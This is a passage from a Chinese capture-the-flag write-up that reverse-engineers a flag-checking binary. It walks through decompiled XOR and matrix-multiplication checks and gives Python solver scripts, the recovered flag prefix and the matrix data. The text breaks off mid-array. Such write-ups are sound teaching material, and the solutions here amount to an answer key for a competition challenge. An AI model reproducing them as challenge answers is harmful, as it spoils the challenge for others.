<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> ( <span class="hljs-built_in">strlen</span>((<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)a1) == <span class="hljs-number">55</span> )<br>  &#123;<br>    v2 = *(_QWORD *)(a1 + <span class="hljs-number">8</span>);<br>    qword_8360 = *(_QWORD *)a1;<br>    qword_8368 = v2;<br>    v3 = *(_QWORD *)(a1 + <span class="hljs-number">24</span>);<br>    qword_8370 = *(_QWORD *)(a1 + <span class="hljs-number">16</span>);<br>    qword_8378 = v3;<br>    dword_8380 = *(_DWORD *)(a1 + <span class="hljs-number">32</span>);<br>    byte_8384 = *(_BYTE *)(a1 + <span class="hljs-number">36</span>);<br>    <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">36</span>; ++i )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( (i ^ *((<span class="hljs-type">char</span> *)&amp;qword_8360 + i)) != byte_6020[i] )<br>      &#123;<br>LABEL_19:<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;nonono, invalid&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1LL</span>;<br>      &#125;<br>    &#125;<br>    v4 = *(_QWORD *)(a1 + <span class="hljs-number">46</span>);<br>    qword_8390 = *(_QWORD *)(a1 + <span class="hljs-number">38</span>);<br>    qword_8398 = v4;<br>    byte_83A0 = *(_BYTE *)(a1 + <span class="hljs-number">54</span>);<br>    <span class="hljs-keyword">for</span> ( j = <span class="hljs-number">0</span>; j &lt;= <span class="hljs-number">2</span>; ++j )<br>    &#123;<br>      <span class="hljs-keyword">for</span> ( k = <span class="hljs-number">0</span>; k &lt;= <span class="hljs-number">4</span>; ++k )<br>      &#123;<br>        <span class="hljs-keyword">if</span> ( (*((<span class="hljs-type">char</span> *)&amp;qword_8390 + <span class="hljs-number">6</span> * j + k) &lt;= <span class="hljs-number">64</span> || *((<span class="hljs-type">char</span> *)&amp;qword_8390 + <span class="hljs-number">6</span> * j + k) &gt; <span class="hljs-number">90</span>)<br>          &amp;&amp; (*((<span class="hljs-type">char</span> *)&amp;qword_8390 + <span class="hljs-number">6</span> * j + k) &lt;= <span class="hljs-number">96</span> || *((<span class="hljs-type">char</span> *)&amp;qword_8390 + <span class="hljs-number">6</span> * j + k) &gt; <span class="hljs-number">122</span>)<br>          &amp;&amp; (*((<span class="hljs-type">char</span> *)&amp;qword_8390 + <span class="hljs-number">6</span> * j + k) &lt;= <span class="hljs-number">47</span> || *((<span class="hljs-type">char</span> *)&amp;qword_8390 + <span class="hljs-number">6</span> * j + k) &gt; <span class="hljs-number">57</span>)<br>          || j &lt;= <span class="hljs-number">1</span> &amp;&amp; k == <span class="hljs-number">4</span> &amp;&amp; *((_BYTE *)&amp;qword_8390 + <span class="hljs-number">6</span> * j + <span class="hljs-number">5</span>) != <span class="hljs-number">95</span> )<br>        &#123;<br>          <span class="hljs-keyword">goto</span> LABEL_19;<br>        &#125;<br>      &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;nonono, length wrong&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1LL</span>;<br>  &#125;<br></code></pre></td></tr></table></figure>
<p>a1即为输入的flag，首先在11行对flag前37列进行异或处理，与<code>byte_6020</code>进行比对</p>
<p><code>byte_6020</code>的内容如下</p>
<p><img src="./W4terCTF2024.assets/KdN6J9DZQ8PjMgk.png" srcset="/img/loading.gif" lazyload alt="byte_6020"></p>
<p>用下面的脚本，可以推测flag前37个字符</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python">a = [<span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-string">&#x27;D&#x27;</span>, <span class="hljs-string">&#x27;5&#x27;</span>, <span class="hljs-string">&#x27;\\&#x27;</span>, <span class="hljs-string">&#x27;Q&#x27;</span>, <span class="hljs-string">&#x27;V&#x27;</span>, <span class="hljs-string">&#x27;Y&#x27;</span>, <span class="hljs-string">&#x27;c&#x27;</span>, <span class="hljs-string">&#x27;z&#x27;</span>, <span class="hljs-string">&#x27;H&#x27;</span>, <span class="hljs-string">&#x27;]&#x27;</span>,<br><span class="hljs-string">&#x27;T&#x27;</span>, <span class="hljs-string">&#x27;m&#x27;</span>, <span class="hljs-string">&#x27;R&#x27;</span>, <span class="hljs-string">&#x27;~&#x27;</span>, <span class="hljs-string">&#x27;c&#x27;</span>, <span class="hljs-string">&#x27;S&#x27;</span>, <span class="hljs-string">&#x27;&amp;&#x27;</span>, <span class="hljs-string">&#x27;g&#x27;</span>, <span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;39&#x27;</span>, <span class="hljs-string">&#x27;J&#x27;</span>,<br><span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-string">&#x27;^&#x27;</span>, <span class="hljs-string">&#x27;L&#x27;</span>, <span class="hljs-string">&#x27;Q&#x27;</span>, <span class="hljs-string">&#x27;E&#x27;</span>, <span class="hljs-string">&#x27;V&#x27;</span>, <span class="hljs-string">&#x27;]&#x27;</span>, <span class="hljs-string">&#x27;*&#x27;</span>, <span class="hljs-string">&#x27;L&#x27;</span>, <span class="hljs-string">&#x27;v&#x27;</span>, <span class="hljs-string">&#x27;X&#x27;</span>,<br><span class="hljs-string">&#x27;~&#x27;</span>, <span class="hljs-string">&#x27;22&#x27;</span>, <span class="hljs-string">&#x27;M&#x27;</span>, <span class="hljs-string">&#x27;@&#x27;</span>]<br>b=[]<br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> a:<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(x)==<span class="hljs-number">1</span>:<br>        b.append(<span class="hljs-built_in">ord</span>(x))<br>    <span class="hljs-keyword">else</span>:<br>        b.append(<span class="hljs-built_in">int</span>(x))<br><span class="hljs-built_in">print</span>(b)<br>c=[]<br><span class="hljs-keyword">for</span> i,x <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(b):<br>    c.append(<span class="hljs-built_in">chr</span>(x^i))<br>s=<span class="hljs-string">&#x27;&#x27;</span>.join(c)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(s))<br><span class="hljs-built_in">print</span>(s)<br></code></pre></td></tr></table></figure>
<p>结果为<code>1E7_US_drAW_a_plC7ur3_WITH_MA7Rix_4nd</code></p>
<p>代码24行之后限定了flag的37位之后的格式</p>
<p>得到flag为<code>1E7_US_drAW_a_plC7ur3_WITH_MA7Rix_4nd_aaaaa_aaaaa_aaaaa</code>，其中a为未知</p>
<h4 id="sub-24BD">sub_24BD</h4>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">4</span>; ++i )<br>&#123;<br>    <span class="hljs-keyword">for</span> ( j = <span class="hljs-number">0</span>; j &lt;= <span class="hljs-number">16</span>; ++j )<br>    &#123;<br>        dword_83C0[<span class="hljs-number">17</span> * i + j] = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> ( k = <span class="hljs-number">0</span>; k &lt;= <span class="hljs-number">16</span>; ++k )<br>            dword_83C0[<span class="hljs-number">17</span> * i + j] += byte_8020[<span class="hljs-number">55</span> * i + k] * dword_6060[<span class="hljs-number">17</span> * k + j];<br>    &#125;<br>&#125;<br><span class="hljs-keyword">if</span> ( <span class="hljs-built_in">memcmp</span>(dword_83C0, &amp;unk_6500, <span class="hljs-number">0x154</span>uLL) )<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1LL</span>;<br><span class="hljs-keyword">for</span> ( m = <span class="hljs-number">0</span>; m &lt;= <span class="hljs-number">4</span>; ++m )<br>&#123;<br>    <span class="hljs-keyword">for</span> ( n = <span class="hljs-number">0</span>; n &lt;= <span class="hljs-number">16</span>; ++n )<br>    &#123;<br>        dword_83C0[<span class="hljs-number">17</span> * m + n] = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> ( ii = <span class="hljs-number">0</span>; ii &lt;= <span class="hljs-number">16</span>; ++ii )<br>            dword_83C0[<span class="hljs-number">17</span> * m + n] += byte_8020[<span class="hljs-number">55</span> * m + <span class="hljs-number">275</span> + ii] * dword_6660[<span class="hljs-number">17</span> * ii + n];<br>    &#125;<br>&#125;<br><span class="hljs-keyword">if</span> ( <span class="hljs-built_in">memcmp</span>(dword_83C0, &amp;unk_6B00, <span class="hljs-number">0x154</span>uLL) )<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1LL</span>;<br><span class="hljs-keyword">for</span> ( jj = <span class="hljs-number">0</span>; jj &lt;= <span class="hljs-number">4</span>; ++jj )<br>&#123;<br>    <span class="hljs-keyword">for</span> ( kk = <span class="hljs-number">0</span>; kk &lt;= <span class="hljs-number">16</span>; ++kk )<br>    &#123;<br>        dword_83C0[<span class="hljs-number">17</span> * jj + kk] = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> ( mm = <span class="hljs-number">0</span>; mm &lt;= <span class="hljs-number">16</span>; ++mm )<br>            dword_83C0[<span class="hljs-number">17</span> * jj + kk] += byte_8020[<span class="hljs-number">55</span> * jj + <span class="hljs-number">550</span> + mm] * dword_6C60[<span class="hljs-number">17</span> * mm + kk];<br>    &#125;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">memcmp</span>(dword_83C0, &amp;unk_7100, <span class="hljs-number">0x154</span>uLL) != <span class="hljs-number">0</span>;<br></code></pre></td></tr></table></figure>
<p>以第一组for循环为例，实际上是将byte_8020的前五行和dword_6060进行矩阵乘法，将结果和unk_6500对比</p>
<p>dword_6060和unk_6500的数据可以在内存中找到，进行一个矩阵的逆运算，就能求出byte_8020的前五行</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> data <span class="hljs-keyword">import</span> x6500, x6060<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hex_to_arr</span>(<span class="hljs-params">hex_str: <span class="hljs-built_in">str</span></span>):<br>    hex_str = hex_str.strip()<br>    hex_str = hex_str.replace(<span class="hljs-string">&#x27;\n&#x27;</span>, <span class="hljs-string">&#x27; &#x27;</span>)<br>    hex_str = hex_str.replace(<span class="hljs-string">&#x27;\r&#x27;</span>, <span class="hljs-string">&#x27; &#x27;</span>)<br>    hex_str = hex_str.replace(<span class="hljs-string">&#x27;  &#x27;</span>, <span class="hljs-string">&#x27; &#x27;</span>)<br>    hex_str = hex_str.split(<span class="hljs-string">&#x27; &#x27;</span>)<br>    hex_str = [<span class="hljs-built_in">int</span>(i, <span class="hljs-number">16</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> hex_str]<br>    <span class="hljs-keyword">return</span> hex_str<br><br>x6500 = hex_to_arr(x6500)<br><span class="hljs-comment">#print(len(x6500))</span><br>x6060 = hex_to_arr(x6060)<br><span class="hljs-comment">#print(len(x6060))</span><br>d65 = np.zeros((<span class="hljs-number">5</span>,<span class="hljs-number">17</span>))<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">17</span>):<br>        <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>            d65[i][j] += x6500[i*<span class="hljs-number">17</span>*<span class="hljs-number">4</span>+j*<span class="hljs-number">4</span>+k]*<span class="hljs-number">256</span>**(k)<br>d60 = np.zeros((<span class="hljs-number">17</span>, <span class="hljs-number">17</span>))<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">17</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">17</span>):<br>        <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>            d60[i][j] += x6060[i*<span class="hljs-number">17</span>*<span class="hljs-number">4</span>+j*<span class="hljs-number">4</span>+k]*<span class="hljs-number">256</span>**(k)<br>d60_inv = np.linalg.inv(d60)<br>d80 = np.dot(d65, d60_inv)<br><span class="hljs-built_in">print</span>(d80)<br></code></pre></td></tr></table></figure>
<p>结果为</p>
<figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs inform7"><span class="hljs-comment">[<span class="hljs-comment">[32. 32. 49. 49. 32. 32. 32. 32. 32. 32. 32. 32. 32. 32. 49. 49. 49.]</span></span><br><span class="hljs-comment"> <span class="hljs-comment">[32. 32. 49. 49. 49. 49. 32. 32. 49. 49. 32. 32. 32. 32. 49. 49. 32.]</span></span><br><span class="hljs-comment"> <span class="hljs-comment">[32. 32. 49. 49. 49. 49. 32. 32. 49. 49. 32. 32. 49. 49. 32. 32. 32.]</span></span><br><span class="hljs-comment"> <span class="hljs-comment">[49. 49. 49. 49. 49. 49. 49. 49. 49. 49. 32. 32. 49. 49. 32. 32. 32.]</span></span><br><span class="hljs-comment"> <span class="hljs-comment">[32. 32. 49. 49. 49. 49. 49. 49. 49. 49. 32. 32. 49. 49. 32. 32. 32.]</span>]</span><br></code></pre></td></tr></table></figure>
<p>同样的方法，可以得到byte_8020的后10行</p>
<h4 id="sub-1483">sub_1483</h4>
<p>代码的逻辑大致是根据输入的flag的后17位，构造byte_8020</p>
<p>刚才已经求出了byte_8020，可以用下面的脚本求出flag后17位</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><code class="hljs python">small_alpha_bet = [<br><span class="hljs-string">&#x27;      11    11    111111111111111111    11    11       &#x27;</span>,<br><span class="hljs-string">&#x27;           111  1119911191119                          &#x27;</span>,<br><span class="hljs-string">&#x27;          11  11111111119999991111111111  11           &#x27;</span>,<br><span class="hljs-string">&#x27;  9   9111        9        111  9   99      9   111    &#x27;</span>,<br><span class="hljs-string">&#x27;            111111111199111111991111111111             &#x27;</span>,<br><span class="hljs-string">&#x27;111  9  9111  1111119111111   111         111  9       &#x27;</span>,<br><span class="hljs-string">&#x27;99111  111      9           111111  111  111         11&#x27;</span>,<br><span class="hljs-string">&#x27;   111     9   111      1119            111   111  111 &#x27;</span>,<br><span class="hljs-string">&#x27;   9         111111      9      9      111  99111   111&#x27;</span>,<br><span class="hljs-string">&#x27;   111     91111119     111         1119111   1119     &#x27;</span>,<br><span class="hljs-string">&#x27;    111         111   9  111      1119     111        1&#x27;</span>,<br><span class="hljs-string">&#x27;        111   11191119    111   991119  111            &#x27;</span>,<br><span class="hljs-string">&#x27;     9111111111              111      9111   111   1119&#x27;</span>,<br><span class="hljs-string">&#x27;1119  111111   111        111111111        9111  99111 &#x27;</span>,<br><span class="hljs-string">&#x27;                        1119        111111   111  111  &#x27;</span>,<br><span class="hljs-string">&#x27;999     111111        1119  111  11199   9        91119&#x27;</span>,<br><span class="hljs-string">&#x27;111        111      9     9111     1119  99   111111111&#x27;</span>,<br><span class="hljs-string">&#x27;        11    11111111111111111111111111    11         &#x27;</span>,<br><span class="hljs-string">&#x27;          11  11                      11  11           &#x27;</span>,<br><span class="hljs-string">&#x27;   99111     111111     111   111  9       111      9  &#x27;</span>,<br><span class="hljs-string">&#x27;        1111119  111111   111              9    111    &#x27;</span>,<br><span class="hljs-string">&#x27;   111      11191111119   111  99        111111   11111&#x27;</span>,<br><span class="hljs-string">&#x27;             111   111     11199           9     991111&#x27;</span>,<br><span class="hljs-string">&#x27;        9111      111      111111      9   99     111  &#x27;</span>,<br><span class="hljs-string">&#x27;9   9      1111119  1119111      111  11111199       11&#x27;</span>,<br><span class="hljs-string">&#x27;        9   111111111     111111111      9111111    111&#x27;</span>]<br><br>upper_alpha_bet = [<br><span class="hljs-string">&#x27;                   111111  99      111  111111111111111&#x27;</span>,<br><span class="hljs-string">&#x27;      11  11    11                  11    11  11       &#x27;</span>,<br><span class="hljs-string">&#x27;  111     9  111      11199111111              11111111&#x27;</span>,<br><span class="hljs-string">&#x27;  11111111  11      1199  11  1199      11  11111111111&#x27;</span>,<br><span class="hljs-string">&#x27;1111111111119   999          111      9  9      111    &#x27;</span>,<br><span class="hljs-string">&#x27;111     99   9111                9111111           1119&#x27;</span>,<br><span class="hljs-string">&#x27;     11111199111111        111111111      111  9111   1&#x27;</span>,<br><span class="hljs-string">&#x27;      11  111111        111111        111111  111      &#x27;</span>,<br><span class="hljs-string">&#x27;        11111111111111111111111111111111111111         &#x27;</span>,<br><span class="hljs-string">&#x27;       1119        111     111   9      111            &#x27;</span>,<br><span class="hljs-string">&#x27;111   111         9      11199111      1119111         &#x27;</span>,<br><span class="hljs-string">&#x27;     111        999   111111111         99     1119111 &#x27;</span>,<br><span class="hljs-string">&#x27;  11          11111111      11111111          11    111&#x27;</span>,<br><span class="hljs-string">&#x27;1111111111  11            11            11  11111111111&#x27;</span>,<br><span class="hljs-string">&#x27;  1111  11    11        11  11        11    11  1111111&#x27;</span>,<br><span class="hljs-string">&#x27;111   9           111111           1119111111   9      &#x27;</span>,<br><span class="hljs-string">&#x27;9111        11111191111111111119   111         111     &#x27;</span>,<br><span class="hljs-string">&#x27;  9111    111111   111   9           111111   111111   &#x27;</span>,<br><span class="hljs-string">&#x27;9111   911199     111111           9     9         9111&#x27;</span>,<br><span class="hljs-string">&#x27;       111   111  9  9   99   1111119      111        1&#x27;</span>,<br><span class="hljs-string">&#x27;  1111  11  11            11            11  11  1111111&#x27;</span>,<br><span class="hljs-string">&#x27;111        111  111111111        111111111           11&#x27;</span>,<br><span class="hljs-string">&#x27;    1111    11      9999  11  9999      1111  11111    &#x27;</span>,<br><span class="hljs-string">&#x27;111111     1119111       9      99111   1111119111     &#x27;</span>,<br><span class="hljs-string">&#x27;111     9   9   111        1119  111      1111111119111&#x27;</span>,<br><span class="hljs-string">&#x27;  111     111111111111         1119   111111   1111119 &#x27;</span>]<br><br><br>num_bet = [<br><span class="hljs-string">&#x27;111  9   111     99  111111   111           111     111&#x27;</span>,<br><span class="hljs-string">&#x27;   111   111111      111     9111   111   1111119111  1&#x27;</span>,<br><span class="hljs-string">&#x27;             9   9   9111111  9      111111111     111 &#x27;</span>,<br><span class="hljs-string">&#x27;111       9111111111   111   111        1111111119  911&#x27;</span>,<br><span class="hljs-string">&#x27;99  9111        1119        1119  111        1119     9&#x27;</span>,<br><span class="hljs-string">&#x27;   9   111111   9111   9111111111                  9  1&#x27;</span>,<br><span class="hljs-string">&#x27;     111   111   111  111111              9     9111111&#x27;</span>,<br><span class="hljs-string">&#x27;          1111111111111111111111111111111111           &#x27;</span>,<br><span class="hljs-string">&#x27;       9      111111     9    1111111111111119         &#x27;</span>,<br><span class="hljs-string">&#x27;111   111111999111111  9   9111     111   9111        1&#x27;</span>]<br><br>matrix_8020 = [<br>[<span class="hljs-number">32</span>, <span class="hljs-number">32</span>, <span class="hljs-number">49</span>, <span class="hljs-number">49</span>, <span class="hljs-number">32</span>, <span class="hljs-number">32</span>, <span class="hljs-number">32</span>, <span class="hljs-number">32</span>, <span class="hljs-number">32</span>, <span class="hljs-number">32</span>, <span class="hljs-number">32</span>, <span class="hljs-number">32</span>, <span class="hljs-number">32</span>, <span class="hljs-number">32</span>, <span class="hljs-number">49</span>, <span class="hljs-number">49</span>, <span class="hljs-number">49</span>],<br>[<span class="hljs-number">32</span>, <span class="hljs-number">32</span>, <span class="hljs-number">49</span>, <span class="hljs-number">49</span>, <span class="hljs-number">49</span>, <span class="hljs-number">49</span>, <span class="hljs-number">32</span>, <span class="hljs-number">32</span>, <span class="hljs-number">49</span>, <span class="hljs-number">49</span>, <span class="hljs-number">32</span>, <span class="hljs-number">32</span>, <span class="hljs-number">32</span>, <span class="hljs-number">32</span>, <span class="hljs-number">49</span>, <span class="hljs-number">49</span>, <span class="hljs-number">32</span>],<br>[<span class="hljs-number">32</span>, <span class="hljs-number">32</span>, <span class="hljs-number">49</span>, <span class="hljs-number">49</span>, <span class="hljs-number">49</span>, <span class="hljs-number">49</span>, <span class="hljs-number">32</span>, <span class="hljs-number">32</span>, <span class="hljs-number">49</span>, <span class="hljs-number">49</span>, <span class="hljs-number">32</span>, <span class="hljs-number">32</span>, <span class="hljs-number">49</span>, <span class="hljs-number">49</span>, <span class="hljs-number">32</span>, <span class="hljs-number">32</span>, <span class="hljs-number">32</span>],<br>[<span class="hljs-number">49</span>, <span class="hljs-number">49</span>, <span class="hljs-number">49</span>, <span class="hljs-number">49</span>, <span class="hljs-number">49</span>, <span class="hljs-number">49</span>, <span class="hljs-number">49</span>, <span class="hljs-number">49</span>, <span class="hljs-number">49</span>, <span class="hljs-number">49</span>, <span class="hljs-number">32</span>, <span class="hljs-number">32</span>, <span class="hljs-number">49</span>, <span class="hljs-number">49</span>, <span class="hljs-number">32</span>, <span class="hljs-number">32</span>, <span class="hljs-number">32</span>],<br>[<span class="hljs-number">32</span>, <span class="hljs-number">32</span>, <span class="hljs-number">49</span>, <span class="hljs-number">49</span>, <span class="hljs-number">49</span>, <span class="hljs-number">49</span>, <span class="hljs-number">49</span>, <span class="hljs-number">49</span>, <span class="hljs-number">49</span>, <span class="hljs-number">49</span>, <span class="hljs-number">32</span>, <span class="hljs-number">32</span>, <span class="hljs-number">49</span>, <span class="hljs-number">49</span>, <span class="hljs-number">32</span>, <span class="hljs-number">32</span>, <span class="hljs-number">32</span>],<br>[<span class="hljs-number">32</span>, <span class="hljs-number">32</span>, <span class="hljs-number">32</span>, <span class="hljs-number">32</span>, <span class="hljs-number">49</span>, <span class="hljs-number">49</span>, <span class="hljs-number">49</span>, <span class="hljs-number">49</span>, <span class="hljs-number">32</span>, <span class="hljs-number">32</span>, <span class="hljs-number">32</span>, <span class="hljs-number">32</span>, <span class="hljs-number">49</span>, <span class="hljs-number">49</span>, <span class="hljs-number">32</span>, <span class="hljs-number">32</span>, <span class="hljs-number">32</span>],<br>[<span class="hljs-number">32</span>, <span class="hljs-number">32</span>, <span class="hljs-number">32</span>, <span class="hljs-number">32</span>, <span class="hljs-number">32</span>, <span class="hljs-number">32</span>, <span class="hljs-number">49</span>, <span class="hljs-number">49</span>, <span class="hljs-number">32</span>, <span class="hljs-number">32</span>, <span class="hljs-number">49</span>, <span class="hljs-number">49</span>, <span class="hljs-number">49</span>, <span class="hljs-number">49</span>, <span class="hljs-number">49</span>, <span class="hljs-number">49</span>, <span class="hljs-number">32</span>],<br>[<span class="hljs-number">32</span>, <span class="hljs-number">32</span>, <span class="hljs-number">32</span>, <span class="hljs-number">32</span>, <span class="hljs-number">32</span>, <span class="hljs-number">32</span>, <span class="hljs-number">32</span>, <span class="hljs-number">32</span>, <span class="hljs-number">49</span>, <span class="hljs-number">49</span>, <span class="hljs-number">49</span>, <span class="hljs-number">49</span>, <span class="hljs-number">49</span>, <span class="hljs-number">49</span>, <span class="hljs-number">49</span>, <span class="hljs-number">49</span>, <span class="hljs-number">49</span>],<br>[<span class="hljs-number">32</span>, <span class="hljs-number">32</span>, <span class="hljs-number">32</span>, <span class="hljs-number">32</span>, <span class="hljs-number">32</span>, <span class="hljs-number">32</span>, <span class="hljs-number">32</span>, <span class="hljs-number">32</span>, <span class="hljs-number">32</span>, <span class="hljs-number">32</span>, <span class="hljs-number">49</span>, <span class="hljs-number">49</span>, <span class="hljs-number">49</span>, <span class="hljs-number">49</span>, <span class="hljs-number">49</span>, <span class="hljs-number">49</span>, <span class="hljs-number">49</span>],<br>[<span class="hljs-number">32</span>, <span class="hljs-number">32</span>, <span class="hljs-number">32</span>, <span class="hljs-number">32</span>, <span class="hljs-number">32</span>, <span class="hljs-number">32</span>, <span class="hljs-number">32</span>, <span class="hljs-number">32</span>, <span class="hljs-number">32</span>, <span class="hljs-number">32</span>, <span class="hljs-number">32</span>, <span class="hljs-number">32</span>, <span class="hljs-number">49</span>, <span class="hljs-number">49</span>, <span class="hljs-number">49</span>, <span class="hljs-number">49</span>, <span class="hljs-number">49</span>],<br>[<span class="hljs-number">32</span>, <span class="hljs-number">32</span>, <span class="hljs-number">32</span>, <span class="hljs-number">32</span>, <span class="hljs-number">32</span>, <span class="hljs-number">32</span>, <span class="hljs-number">32</span>, <span class="hljs-number">32</span>, <span 